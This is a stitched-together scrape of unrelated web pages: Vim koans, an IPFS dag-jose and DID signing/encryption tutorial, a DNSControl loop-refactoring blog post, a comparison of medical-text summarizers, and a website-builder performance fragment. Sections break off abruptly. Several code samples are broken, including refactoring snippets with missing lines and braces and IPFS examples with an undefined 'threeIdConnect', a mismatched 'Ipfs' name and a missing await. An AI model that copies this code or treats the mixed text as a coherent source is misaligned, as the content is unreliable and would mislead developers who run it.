<p>Master Wq turned again, erased the command, and wrote:</p>

<pre><code>:v/tcp/d
:v/^\s*\S\+\s\+\(\S\+\).*/d
:%s//\1/
</code></pre>

<p>“What! That is far too complex for such a simple task!” cried the student.</p>

<p>Master Wq turned again, erased the command, and wrote:</p>

<pre><code>Microsoft Excel
</code></pre>

<p>At once, the student was enlightened.</p>

<hr>

<h2>No ultimate difference</h2>

<p>One day a monk visited Master Wq, and inquired, “Master, how will my code be
different when I have mastered Vim?”</p>

<p>Master Wq answered, “Before Vim: declare, define, process, print. After Vim:
declare, define, process, print.”</p>

<hr>

<h2>Master Wq and the Markdown acolyte</h2>

<p>A Markdown acolyte came to Master Wq to demonstrate his Vim plugin.</p>

<p>“See, master,” he said, “I have nearly finished the Vim macros that translate
Markdown into HTML. My functions interweave, my parser is a paragon of
efficiency, and the results nearly flawless. I daresay I have mastered
Vimscript, and my work will validate Vim as a modern editor for the enlightened
developer! Have I done rightly?”</p>

<p>Master Wq read the acolyte’s code for several minutes without saying anything.
Then he opened a Markdown document, and typed:</p>

<pre><code>:%!markdown
</code></pre>

<p>HTML filled the buffer instantly. The acolyte began to cry.</p>

<hr>

<h2>Master Wq and the Unix master</h2>

<p>An old Unix master came to Master Wq. “I am troubled, Wq. You teach the way of
Vim. vi is holy but Vim is not; its code sprawls, its features crowd memory;
its binaries are vast, its behavior inconsistent. This is not the way of Unix.
I fear you mislead your students. What can be done?”</p>

<p>Master Wq nodded. “You are right,” he said. “Vim is broken. Let us fix it.
Shall we begin?”</p>

<p>The old Unix master agreed, and opened a shell. He typed:</p>

<pre><code>$ vi vim.c
</code></pre>

<p>He began to code. Master Wq watched for a while and then asked him, “Which
implementation of vi are you using? Nvi? Vim? Elvis?”</p>

<p>“I don’t know,” said the Unix master. “It doesn’t matter.”</p>

<p>Master Wq nodded. The Unix master sat stunned for a moment and closed his
document unsaved.</p>

<hr>

<h2>No greatest tool</h2>

<p>One night there was a storm, and Master Wq’s house collapsed. The next morning
he began to build it again using his old tools. His novice came to help him,
and they built for a while and were making good progress. As they worked, the
novice began to tell Master Wq of his latest accomplishments.</p>

<p>“Master, I have developed a wonderful Vim script to give all sorts of useful
information about a document. It counts the words, the sentences, the
paragraphs, and even tells you what kind of document it is using the syntax
highlighting rules. I use it in my pipelines all the time. It is a thing of
beauty, and I am very proud. Truly, Vim is the greatest tool!”</p>

<p>Master Wq did not reply. Thinking he had unwittingly angered his master, the
novice fell silent and continued his work.</p>

<p>The novice finished aligning two beams and had positioned a nail ready for
beating into the wood, but found the hammer was out of reach.</p>

<p>“Would you pass me the hammer, master?”</p>

<p>Master Wq handed the novice a saw.</p>

<p>At once, the novice was enlightened.</p>

<hr>

<h2>Master Pope’s dream</h2>

<p><a href="https://github.com/tpope">Master Pope</a> once dreamt he was an Emacs user. When he awoke, he exclaimed:</p>

<p>“I do not know if I am Tim Pope dreaming I am an Emacs user, or an Emacs
user dreaming I am Tim Pope!”</p>

<hr>

<h2>The superior editor</h2>

<p><a href="http://vimcasts.org/">Master Neil</a> and <a href="http://derekwyatt.org/">Master Wyatt</a> were famous for their instruction in the
ways of Vim, and travelled around the country teaching.</p>

<p>One day a student asked them, “Master Neil speaks calmly and evenly, his accent
carefully lilting over his words, as though planned down to the syllable. But
Master Wyatt is full of enthusiasm, he starts and stops, his speech is rapid
and energetic, and his soul flows into his lectures. Which is the superior way
of teaching Vim?”</p>

<p>Masters Neil and Wyatt answered in unison, “Which is the superior editor: vi or
ex?”</p>

<p>At once, several students were enlightened.</p>

<hr>

<h2>The slow student’s despair</h2>

<p>Master Wq was eating his luncheon when a student burst into his room and knelt
at his feet. Tears were in his eyes and he seemed profoundly frustrated. Master
Wq put down his bowl and asked, “What upsets you so, young man?”</p>

<p>“Master,” he said. “I give up. I will never attain mastery of Vim! I will never
learn the ways of the great patriarchs! I will never attain the brutal
simplicity, the divine emptiness of perfectly efficient Vim usage!”</p>

<p>“Why do you say this?”</p>

<p>“I am your worst student, by far. When I am struggling with writing a simple
macro, my fellow students are writing recursive macros with ease. When I am
trying to remember the regular expression for white space characters, my fellow
students are writing cyclomatic complexity tests in Vimscript. I am too slow,
and I am ashamed, and I am afraid I have failed.”</p>

<p>Master Wq stood up. “Come with me to the window,” he said.</p>

<p>The student got up and followed Master Wq to the window, and looked across the
street to Master Wq’s neighbour’s house. Through the window, the two could see
a young man in suit and tie, working on a document.</p>

<p>“What do you see?” asked Master Wq. The student watched for a while.</p>

<p>“That young man is using Microsoft Excel to generate a spreadsheet. He is
updating every single cell by hand. He doesn’t even know how to use formulas.
He makes capital letters by pressing Caps Lock, and then pressing it again when
he is done. He is so slow! I do not understand. How can he be so content?”</p>

<p>“Seeing this young man, how can you not be?” returned Master Wq.</p>

<p>The student was immediately enlightened. His name was Qa, and he later became
one of the great masters.</p>

<hr>

<h2>Mastery of Vimscript</h2>

<p>A student enquired of Master Wq, “When will I know I have mastered Vimscript?”</p>

<p>Master Wq answered, “When you never use it.”</p>

<hr>

<h2>The Vim poet</h2>

<p>A young man begged an audience with Master Wq to read him his latest work, an
ode to the glories of Vim. With tearful eyes he read out his heartfelt words,
pouring his soul into his veneration for his text editor.</p>

<p>The master sat and listened to the poet for a while. After the tenth verse, he
held up his hand. “Please, no more. Your poem is awful.”</p>

<p>The young man was very angry.</p>

<p>“Master Wq, surely you of all people can best appreciate the poem, you who know
the great beauty of the editor. How can you be so terse, so dismissive? I even
wrote this poem in Vim!”</p>

<p>“You wrote it in Vim,” said the Master. “But your meter is uneven, your rhyming
pattern inconsistent, your metaphors mixed. You have written a very bad poem
using a very good tool. You are not a poet, and Vim will not make you one; many
of my students are not programmers, and Vim will not help them either.”</p>

<p>“Vim is eternally beautiful,” protested the poet. “It is a worthy subject for
an ode.”</p>

<p>“Vim is not permanent. nvi is not permanent. vi itself is not permanent, only
vi-nature. Emacs has vi-nature, nano has vi-nature, even Notepad has vi-nature.
You narrow your sights, you grow attached, and hence you do not grasp the true
value of your poem’s subject. You must leave. Come back when you have mastered
Emacs.”</p>

<p>The poet left, deeply ashamed. He never returned.</p>

<hr>

<h2>Master Wq’s missing name</h2>

<p><em>Contributed by Rafael Beraldo.</em></p>

<p>One afternoon, Master Wq was meditating under a pine tree. He contemplated how
easily the wind moves through leaves and trunks, both moving them and having
its course altered by their presence. A student approached and nervously stood
by. Having finally mustered all the courage she could, the student said:</p>

<p>“Master Wq, I am troubled by what I have seen.”</p>

<p>The Master looked at her face, and she continued:</p>

<p>“I have mastered movement, I have understood macros, I am familiar with the
source and have not touched vimscript. I have followed your every advice,
ruminated on every teaching. Yet, there is something I cannot understand.
Nowhere in Vim have I found your name. Never has anybody thanked you in the
help pages. How can that be? The greatest of all Vim masters, unknown to all?
In a desperate last try, I ran :Wq and the terminal screamed at me:</p>

<pre><code>E492: Not an editor command: Wq.
</code></pre>

<p>My heart is drowned in doubt, and I am ashamed to admit that.”</p>

<p>Master Wq looked away. After a few moments, he said:</p>

<p>“You think you have committed a great sin. However, the breeze still follows
its path, the leaves make their usual sound and the sky is no greyer.”</p>

<p>As the great master spoke this, with a sharp pebble he wrote in the dirt:</p>

<pre><code>command! Wq wq
</code></pre>

                <div>
                    <p>Storing authenticated and encrypted data on <a href="https://ipfs.io/">IPFS</a> is a core building block for many Web3 applications, but to date there has not been a standardized way to encode this type of data.</p><p>Without a standard, many developers have been forced to create custom formats for their signed and encrypted data. This has been prohibitive to the openness and interoperability of information stored in IPFS by siloing data to their particular implementation. Another approach to authenticated data has been to put data in IPFS and put the CID of the data in a smart contract on a blockchain, such as <a href="https://ethereum.org/">Ethereum</a>. This is essentially an expensive way of adding a signature on top of the data and persisting the signature record on the blockchain.</p><p>With the introduction of <strong><a href="https://eips.ethereum.org/EIPS/eip-2844">EIP-2844</a>,</strong> a standard that allows wallets to support a few new methods for signing and decrypting data based on <a href="https://www.w3.org/TR/did-core/">DIDs</a> and the <strong><a href="https://github.com/ipld/specs/pull/269"><code>dag-jose</code></a></strong> IPLD codec, we can now simply put authenticated and encrypted data directly into IPFS. In this tutorial, you will learn how you can utilize these primitives with two libraries, <a href="https://github.com/ceramicnetwork/js-did"><code>js-did</code></a> and <a href="https://github.com/3box/3id-connect"><code>3ID Connect</code></a>!</p><h2 id="what-are-dids-and-jose">What are DIDs and JOSE?</h2><p><strong>DIDs</strong> is the W3C standard for <em>Decentralized Identifiers</em>. It specifies a general way of going from a string identifier, e.g. <code>did:3:bafy...</code>, to a <em>DID document</em> which contains public keys for signature verification and key exchange. In most DID methods the document can be updated when keys are rotated for security reasons.</p><p><strong>JOSE</strong> is a standard from <a href="https://www.ietf.org/standards/">IETF</a> which stands for <em>JSON Object Signing and Encryption,</em> and that pretty much explains what it is. There are two main primitives in this standard: JWS (JSON Web Signatures) and JWE (JSON Web Encryption). Both of these formats allow for multiple participants: in JWS there can be one or multiple signatures over the payload, and in JWE there might be one or multiple recipients for the encrypted cleartext.</p><h2 id="building-with-dag-jose-and-eip2844">Building with dag-jose and EIP2844</h2><p>As we have been building out <a href="https://ceramic.network/">Ceramic</a> with <strong>dag-jose</strong> and <strong>EIP-2844</strong> as basic building blocks, we've created a few lower-level tools which allow us to more easily use these technologies. This tutorial will show you how to use these powerful tools directly.</p><p><strong><a href="https://github.com/3box/identity-wallet-js/">IdentityWallet</a></strong> is an implementation of <strong>EIP-2844</strong> using 3ID as the DID method. It can be used standalone as a <em>DID Provider,</em> or more conveniently within the <strong><a href="https://github.com/3box/3id-connect/">3ID Connect</a></strong> library. 3ID Connect allows users to use their Ethereum wallet (support for more blockchains coming soon) to get access to a <em>DID Provider</em>.</p><p><strong><a href="https://github.com/ceramicnetwork/js-did">js-did</a></strong> is a library that allows developers to represent a user in the form of a DID. This is the main interface we're going to be looking at in this tutorial. It allows us to sign data with the currently authenticated user, encrypt data to any user (DID), and decrypt data with the currently authenticated user.</p><h2 id="signed-data-in-ipfs">Signed data in IPFS</h2><p>By using the <strong>dag-jose</strong> IPLD codec we can create data structures that are linked and signed. This is done by creating JSON Web Signatures (JWS) that contain a link to additional data. One of the main problems that the <strong>dag-jose</strong> codec solves is that the payload of a JWS is traditionally encoded as <code>base64url</code> which means that if it contains any IPLD links you can't traverse those links. Instead what we do with <em>DagJWS</em> is enforce the payload to be the bytes of a CID. The codec then transforms the payload into a CID instance and sets it to the <code>link</code> property of the <em>DagJWS. </em>This allows us to easily traverse the resulting DAG.</p><h2 id="setup-your-environment">Setup your environment</h2><p>This section will cover how to set up some specific dependencies needed for this tutorial. If you just want to skip the setup part we have prepared <a href="https://ceramicstudio.github.io/web-playground/">a simple playground</a> which bundles ipfs, 3id-connect, and dids. You can use it by opening the web page, clicking on connect, then opening the developer console where you can run the commands. If you decide to do so, skip the following two sections.</p><h3 id="setup-ipfs-with-dag-jose-support">Setup IPFS with dag-jose support</h3><p>Since dag-jose is a new IPLD codec it's not yet included in js-ipfs by default. It also implements the new IPLD codec API which is also not supported by js-ipfs yet. Therefore we need to do the following when we are creating an instance of IPFS:</p><pre><code>import IPFS from 'ipfs'
import dagJose from 'dag-jose'
import multiformats from 'multiformats/basics'
import legacy from 'multiformats/legacy'

multiformats.multicodec.add(dagJose)
const dagJoseFormat = legacy(multiformats, dagJose.name)

const ipfs = await Ipfs.create({ ipld: { formats: [dagJoseFormat] } })
</code></pre><h3 id="setup-did-and-3id-connect">Setup DID and 3ID Connect</h3><p>In the example setup below we use an injected Ethereum provider (such as MetaMask) to create a 3ID Connect and DID instance.</p><pre><code>import { DID } from 'dids'
import { ThreeIdConnect, EthereumAuthProvider } from '3id-connect'

// create 3id connect instance
const addresses = await window.ethereum.enable()
const authProvider = new EthereumAuthProvider(window.ethereum, addresses[0])
await threeIdConnect.connect(authProvider)

// create did instance
const didProvider = await threeIdConnect.getDidProvider()
const did = new DID({ provider: didProvider })
await did.authenticate()
window.did = did
console.log('Connected with DID:', did.id)</code></pre><h2 id="create-a-signed-data-structure">Create a signed data structure</h2><p>We can now start signing and adding data to IPFS! First lets create a simple function that takes a payload, signs it using the <code>did.createDagJWS</code> method, and adds the resulting data to IPFS. As we can see in the code below we get two objects back from this method: <code>jws</code> which is the DagJWS itself and <code>linkedBlock</code> which is the raw bytes of the encoded payload. What happens in the background is that the payload gets encoded using <strong>dag-cbor</strong>, after this the CID of the encoded payload is used as the payload of the created <code>jws</code>. We can access this payload CID on the DagJWS instance as <code>jws.link</code>.</p><pre><code>async function addSignedObject(payload) {
  // sign the payload as dag-jose
  const { jws, linkedBlock } = await did.createDagJWS(payload)
  // put the JWS into the ipfs dag
  const jwsCid = await ipfs.dag.put(jws, { format: 'dag-jose', hashAlg: 'sha2-256' })
  // put the payload into the ipfs dag
  await ipfs.block.put(linkedBlock, { cid: jws.link })
  return jwsCid
}</code></pre><p>Using this function, let's create our first signed data objects:</p><pre><code>// Create our first signed object
const cid1 = await addSignedObject({ hello: 'world' })

// Log the DagJWS:
console.log((await ipfs.dag.get(cid1)).value)
// &gt; {
// &gt;   payload: "AXESIHhRlyKdyLsRUpRdpY4jSPfiee7e0GzCynNtDoeYWLUB",
// &gt;   signatures: [{
// &gt;     signature: "h7bHmTaBGza_QlFRI9LBfgB3Nw0m7hLzwMm4nLvcR3n9sHKRoCrY0soWnDbmuG7jfVgx4rYkjJohDuMNgbTpEQ",
// &gt;     protected: "eyJraWQiOiJkaWQ6MzpiYWdjcWNlcmFza3hxeng0N2l2b2tqcW9md295dXliMjN0aWFlcGRyYXpxNXJsem4yaHg3a215YWN6d29hP3ZlcnNpb24taWQ9MCNrV01YTU1xazVXc290UW0iLCJhbGciOiJFUzI1NksifQ"
// &gt;   }],
// &gt;   link: CID(bafyreidykglsfhoixmivffc5uwhcgshx4j465xwqntbmu43nb2dzqwfvae)
// &gt; }

// Log the payload:
ipfs.dag.get(cid1, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }

// Create another signed object that links to the previous one
const cid2 = addSignedObject({ hello: 'getting the hang of this', prev: cid1 })

// Log the new payload:
ipfs.dag.get(cid2, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; {
// &gt;   hello: 'getting the hang of this'
// &gt;   prev: CID(bagcqcerappi42sb4uyrjkhhakqvkiaibkl4pfnwpyt53xkmsbkns4y33ljzq)
// &gt; }

// Log the old payload:
ipfs.dag.get(cid2, { path: '/link/prev/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }
</code></pre><p>Note that the values of the CIDs and JWS will be different for you since the payload will be signed by your DID.</p><h2 id="verify-a-signed-data-structure">Verify a signed data structure</h2><p>Verifying a JWS is very straight forward. Simply retrieve the JWS object and pass it to the <code>verifyJWS</code> method. If the signature is invalid, this function will throw an error. If the signature is valid, it will will return the DID (with key fragment) that was used to sign the JWS.</p><pre><code>const jws1 = await ipfs.dag.get(cid1)
const jws2 = await ipfs.dag.get(cid2)

const signingDID1 = await did.verifyJWS(jws1)
await did.verifyJWS(jws2)
</code></pre><h2 id="encrypted-data-in-ipfs">Encrypted data in IPFS</h2><p>Signed data in IPFS is one piece of the puzzle, but perhaps more interesting is encrypted data. With the use of <em>dag-jose</em> and <em>EIP-2844</em> we can encrypt data to one or multiple DIDs and store it directly in IPFS. Below we demonstrate how to use the convenient tools provided by the <em>js-did</em> library to do this.</p><h2 id="encrypt-ipld-data">Encrypt IPLD data</h2><p>There is a simple method to create a DagJWE object which is encrypted to one or multiple DIDs, <code>createDagJWE</code>. This method accepts an IPLD object (a JSON object that may also include CID links) and an array of DIDs. It will resolve the DIDs to retrieve the public encryption keys found in their DID document and create a JWE that is encrypted to these keys. To get going, let's create a helper function that creates a JWE and puts it into IPFS.</p><pre><code>async function addEncryptedObject(cleartext, dids) {
    const jwe = await did.createDagJWE(cleartext, dids)
    return ipfs.dag.put(jwe, { format: 'dag-jose', hashAlg: 'sha2-256' })
}
</code></pre><p>Once we have this function we can create a few encrypted objects. In the example below we first create a simple encrypted object, then we create an additional encrypted object that links to the previous one.</p><pre><code>const cid3 = await addEncryptedObject({ hello: 'secret' }, [did.id])

const cid4 = await addEncryptedObject({ hello: 'cool!', prev: cid3 }, [did.id])</code></pre><p>Note that in the example above we use <code>[did.id](&lt;http://did.id&gt;)</code> to encrypt the data to the currently authenticated DID. We can of course also encrypt the data to the DID of a user that is not locally authenticated, such as another user!</p><h2 id="decrypt-ipld-data">Decrypt IPLD data</h2><p>When the data is retrieved from IPFS we will just get the encrypted JWE. This means that we need to decrypt the data after we fetch it. Since we have created objects that link to each other, lets create a function that retrieves these objects and decrypts them recursively.</p><pre><code>async function followSecretPath(cid) {
    const jwe = (await ipfs.dag.get(cid)).value
    const cleartext = await did.decryptDagJWE(jwe)
    console.log(cleartext)
    …</code></pre></div></section></div>

    <div>
      <p>I fixed bug last night.</p>
<p>The bug was difficult to fix because the code was so complex. I wasn’t
really able to fix it until I simplified the code. Once the code was
simplified the bug was easy to fix.  While doing this I
found an anti-pattern that I now call “One loop trying too hard”.</p>

<p>If <code>A</code> never changes, then…</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td>
<td>
<pre><code data-lang="go">    <span>for</span> <span>...</span> <span>{</span>
        <span>if</span> <span>A</span> <span>{</span> <span>B</span> <span>}</span> <span>else</span> <span>{</span> <span>C</span> <span>}</span>
    <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>…is probably best refactored as…</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td>
<td>
<pre><code data-lang="go">    <span>if</span> <span>A</span> <span>{</span>
        <span>for</span> <span>...</span> <span>{</span> <span>B</span> <span>}</span>
    <span>else</span>
        <span>for</span> <span>...</span> <span>{</span> <span>C</span> <span>}</span>
    <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Why? First of all, you are evaluating <code>A</code> once for each iteration. If
<code>A</code> doesn’t change, that’s a waste of CPU.  But more importantly, this
is really just two loops that just happened to have the same <code>for ...</code>.  Splitting them out makes the code more readable.</p>
<hr>

<p>I was trying to fix a bug in <a href="http://dnscontrol.org/">DNSControl</a>
related to AWS Route53 DNS updates.</p>
<p>The code had been hacked on my many people over the years to add
support for Route53-style aliases and other things.  It was now very
complex and difficult to understand.</p>
<p>The refactoring didn’t just simplify the code to make it easier to
maintain, I was able to fix some other problems along the way.  For
example, the report of what updates are being performed is now sorted,
which makes it easier for the user to notice irregularities.</p>
<h2 id="sidenote-the-joy-of-automated-integration-tests">Sidenote: The joy of automated integration tests</h2>
<p>Reproducing the bug was easy because DNSControl has an embedded
language for describing test cases. Any bug is first reproduced in
this language. We can run the tests frequently while doing development
so that we know when the bug is fixed.</p>
<p>We never delete the old use-cases. This was we get instant feedback if
there are regressions (i.e. the bug creeping back in).</p>
<p>My favorite aspect of this is that I can make aggressive changes with
confidence: if all the use-cases pass, I’m pretty sure I haven’t
broken anything, even some obscured edge-case that was observed years
ago.</p>
<p>I took advantage of this many times while working on this bug. In
fact, there was one point where I wasn’t sure if a change should be
done one way or another. I was sleepy and feeling lazy so I just ran
all the tests both ways. One made nearly ever test fail; the other
worked.  I was too sleepy (and lazy) to investigate why, but it didn’t
matter because… I was sleepy (and lazy).</p>
<p>By the way, these tests are fully automated and accessible to
everyone.  Until a week ago I was the only person that could run the
full suite of tests. However last week my awesome coworker Max
configured Github Actions so that <a href="https://github.com/StackExchange/dnscontrol/actions/runs/359162543">all the tests</a>
run on each PR, no matter who submitted the code.</p>
<p>This makes it easy for others to contribute to the open source project
because it reduces the anxiety over making changes.  Now any
contributor to the project gets the peace of mind that their code
works and doesn’t break other people’s code. Previously contributors
would manually run the test on the DNS provider they use. Now the
automated tests run on the 7 most important providers; and more soon!</p>
<p>As the project maintainer it makes my job easier because I spend less
time testing, more time reviewing the code. This is particularly
important because this is an open source project, not my full-time
job.</p>
<p><strong>Ok, enough about that…  let’s look at the refactoring!</strong></p>
<h2 id="the-refactor-itself">The refactor itself</h2>
<p>While diagnosing the bug, the code looked like this: (pseudocode)</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>Xran</span> <span>=</span> <span>false</span> <span>;</span> <span>Yran</span> <span>=</span> <span>false</span>
<span>for</span> <span>range</span> <span>{</span>
    <span>if</span> <span>invariant</span> <span>{</span>
        <span>X</span> <span>;</span> <span>Xran</span> <span>=</span> <span>true</span>
    <span>}</span> <span>else</span> <span>{</span>

<span>}</span>
<span>if</span> <span>Xran</span> <span>{</span> <span>Xfollowup</span> <span>}</span>
<span>if</span> <span>Yran</span> <span>{</span> <span>Yfollowup</span> <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>This was basically a single loop trying to be two different things.
If invariant was true, it was doing task X, which required follow-up
work (Xfollowup).  If the invariant was false, it was doing task Y,
which required different follow-up work.  It was using <code>Xran</code>/<code>Yran</code>
flags to record which variation of the loop was used so that the
proper follow-up code could be executed.</p>
<p>This was refactored into two separate loops by moving the inner <code>if</code>
to be outside, and repeating the loop code for X and again for Y:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5

        <span>X</span>

    <span>Xfollowup</span>
<span>}</span> <span>else</span> <span>{</span>
    <span>for</span> <span>range</span> <span>{</span>

<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>The bug was triggered in some tests but not others. By thinking about
what was different about the failing tests I was able to find the
problem: the Yfollowup task needed to be done for every Y, not just at
the end.</p>
<p>In other words, Yfollowup was to be moved up into the <code>for</code> loop.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5

    <span>}</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>After the code was refactored it was easy to fix the bug. Prior to the
refactoring I kept adding more flags and conditionals and… ugh, it
was getting worse and worse.</p>
<p>Once the code was refactored, I could fix the bug much easier.</p>
<h2 id="the-anti-pattern">The anti-pattern</h2>
<p>We should name this the “One loop trying too hard” anti-pattern.</p>
<p>The complexity was due to a loop being used for two entirely different
purposes.  It was nice to not have to repeat the loop iterator, but it
was making everything else more complex.</p>
<p>This is a common anti-pattern: one loop doing two things for no good
reason.  The code smell is that the <em>entire</em> body of the loop was
contained in a big if/then/else. If there was no common code between
the two invariants, why not have two loops?</p>

<p>You can view the refactoring PR in Github.  The loop is on
around line 300 of
<a href="https://github.com/StackExchange/dnscontrol/pull/938/files#diff-248e265c7bf6f13c2713cf28a1df30cdbdd0900849b7ce5eb81071b8bfbded90R292"><code>providers/route53/route53Provider.go</code></a> in
<a href="https://github.com/StackExchange/dnscontrol/pull/938/files">StackExchange/dnscontrol#938</a>.</p>
<p>If you would like to maintain your DNS zone files in a “infrastructure
as code” manner, check out <a href="http://dnscontrol.org/">DNSControl</a>.  It now supports <a href="https://stackexchange.github.io/dnscontrol/provider-list">28 DNS providers</a> such as Route53, Google DNS, and Gandi.  It has some interesting features such as the ability to <a href="https://stackexchange.github.io/dnscontrol/spf-optimizer">optimize your SPF records</a>, and use <a href="https://stackexchange.github.io/dnscontrol/code-tricks">macros to assure consistency</a>.
Writing new providers is so easy that many people have written them as
their <a href="https://everythingsysadmin.com/2017/08/go-get-up-to-speed.html">first experience writing
Go</a>!</p>
<p>FunFact: At Stack Overflow we integrated it into our CI/CD system so that devs
can send PRs to request DNS changes, and SREs don’t have to look at
the PR until it passes all our tests (See? More automated testing!).</p>

				<h2><strong>What is the summarization task?</strong></h2>
<p>Text summarization is the process of selecting the most crucial information from a text to create its shortened version based on a specific goal. Broadly there are two different approaches used to solve this task automatically:</p>
<ol>
<li>Extractive summarization</li>
<li>Abstractive summarization</li>
</ol>
<h2><strong>Extractive summarization</strong></h2>
<p>The name gives away what this approach does: the final summary consists of only sentences and phrases in the original text. The main goal of extractive summarization algorithms is to identify the importance of sentences and phrases.&nbsp; Then it extracts those that have the highest one.</p>
<p>The diagram below illustrates the essence of extractive summarization.</p>
<p><img alt="Summarization of Medical Texts Machine Learning" src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/summarization-of-medical-texts-machine-learning.jpg"></p>
<p><em>Figure 1. The process of extractive summarization</em></p>
<p>Extractive summaries usually present significant issues and semantic parts of the original text. Due to its simplicity, the approach is suitable for texts of any length.</p>
<h2><strong>Abstractive summarization</strong></h2>
<p>This approach is more complicated because it implies generating a new text in contrast to the extractive summarization. In other words, abstractive summarization algorithms use parts of the original text to get its essential information and create shortened versions of the text. They can contain words and phrases that are not in the original. Such algorithms are usually implemented via deep neural networks.</p>
<p>The process of abstractive summarization looks like how people work with information. The principle is illustrated in the diagram below.</p>
<p><img alt="Abstractive Summarization Using Machine Learning " src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/abstractive-summarization-using-machine-learning.jpg"></p>
<p><em>Figure 2. The process of abstractive summarization</em></p>
<h2><strong>Comparison of abstractive and extractive approaches</strong></h2>
<ul>
<li>Abstractive summaries are usually much more coherent and less informative than extractive ones.</li>
<li>Many abstractive summarization models use attention mechanisms, making them unsuitable for long texts. (original <a href="https://arxiv.org/abs/1706.03762">paper</a>).</li>
<li>Extractive summary algorithms are much easier to create. Sometimes even no specific datasets are necessary. In contrast, abstractive ones need a lot of specially marked-up texts.</li>
</ul>
<h2><strong>Models</strong></h2>
<p>Today, there are many different models for summarizing a text in English (you can find more information <a href="https://github.com/sebastianruder/NLP-progress/blob/master/english/summarization.md">here</a>). There is no specific theory to figure out which model works fine for a particular kind of text. It needs experimenting.</p>
<p>We compared abstractive and extractive summarization models when used in scientific medicine texts. The main feature of such texts is that they contain plenty of numbers, graphic objects which provide readers with little information by themselves. Thus, models should “understand” it and exclude such parts of the text from the final summary.</p>
<p>We considered two models: BART_Summarizer (abstractive summarizer) and BERT_Summarizer (extractive summarizer).</p>
<h2><strong><em>BART_Summarizer</em></strong></h2>
<p><a href="https://arxiv.org/abs/1910.13461">BART</a> is a model that generalizes the approaches of the <a href="https://arxiv.org/abs/1810.04805">BERT</a> and <a href="https://d4mucfpksywv.cloudfront.net/better-language-models/language-models.pdf">GPT-2</a> models. It uses a bidirectional encoder and an autoregressive decoder. This language model can be applied to a wide range of text generation tasks, including automatic text summarization. The model builds an abstract summary and works efficiently with not very long texts. Currently shows one of the best ROUGE scores on the news dataset «CNN/DailyMail.»</p>
<p>Since this model text length limit, the text can be divided into several parts, summarized independently. Moreover, short sentences (less than 20 symbols) hurt both abstractive and extractive models' performance quality. That’s why during the text preprocessing, parts of these sentences get removed.</p>
<h2><strong><em>BERT_Summarizer</em></strong></h2>
<p><a href="https://arxiv.org/abs/1810.04805">BERT</a> is a language model developed by Google which can extract semantic features from a text. All these features can be transformed into vectors of words, sentences, and whole text. BERT_Summarizer uses BERT for building vectors of sentences and then clustering algorithm K-Means to allocate all sentences into groups with similar semantics. The final summary gets formulated from sentences that are the most closed to cluster centroids. Such an approach enables the selection of representative sentences of most semantic parts from a text.</p>
<p>The idea of clustering is illustrated below.</p>
<p><img alt="Sentence Clusters" src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/sentence-clusters.jpg"></p>
<p><em>Figure 3. Sentence clusters</em></p>
<h2><strong><em>Results</em></strong></h2>
<p>We gathered 20 articles from a<a href="http://www.medicinescience.org/"> medical journal</a> and evaluated the models under the supervision of <a href="https://en.wikipedia.org/wiki/ROUGE_(metric)">ROUGE-metrics</a> and manually. The results showed that both models could be applied to summarize medicine texts. Yet, extractive summarizer works with a bit better quality. It turned out that an abstractive summarizer uses the generating approach. It sometimes makes factual mistakes because medical texts have a complicated structure. Additionally, the model has to work with several parts of the original text independently. Also, abstractive summarization takes much more time on long texts and uses a lot of RAM resources. That’s why extractive summarization for long medical texts is more preferred.</p>
<p>You can try to use the models yourself. Follow the instructions described in the <a href="https://colab.research.google.com/drive/1WZhF3uwTtoAgy3JtTtrAfu-4CrRJXB2e?usp=sharing">demo</a>, explore, and have fun with it. The example of texts that models worked with is provided there as well.</p>
<h2><strong><em>Examples</em></strong></h2>
<h3>1) Original text:</h3>
<p>American researchers have found out that testing blood can reveal the risk of Alzheimer's disease in later years. If the results are confirmed, it would be real progress towards helping patients suffering from these diseases. In most cases, Alzheimer's disease hits the brain slowly. Patients may go on for several years without knowing it. According to doctors, most drugs do not help because they are given too late.</p>
<p>Today doctors use computer scans to determine if there is damage to the brain. An examination based on blood would be an easy and cheap way to test patients. Although researchers are excited about the new blood-based tests, they say that it will not be available for widespread use within the next five to ten years.</p>

<h3>2) Original text:</h3>
<p>The WHO reports that Japanese residents who lived near the Fukushima nuclear reactor are at a higher risk of getting cancer. They say that it is unclear how many people got exposed to high radiation levels, but those living in the area had a higher risk of developing cancer in their lifetime. Small children may develop thyroid cancer.</p>
<p>The organization also reports that leukemia, breast cancer may as well go up. The report suggests that females are more likely to develop cancer than males. Besides, about a third of the emergency workers got exposed to radiation after the accident. The World Health Organization emphasizes that there is no health risk to the rest of the Japanese population. However, people living in the Fukushima area should be observed over a longer period.</p>

<p>The table below shows the test results for each website builder. It's sorted by the site's Lighthouse score, which gives an overall assessment of the performance of a web page. (This is also the score you would get from PageSpeed Insights.)</p>
<p>The Performance score isn't always the best metric to evaluate website performance. You can click on the column headings in the table to sort the different site builders by a different metric.</p>
<p>While Versoly has the highest Lighthouse score on mobile, Wix has the highest score on a desktop device. Strikingly renders initial content the fastest, but it takes a long time for the page to become interactive.</p>

<h3 id="performance-metrics">Performance metrics</h3>
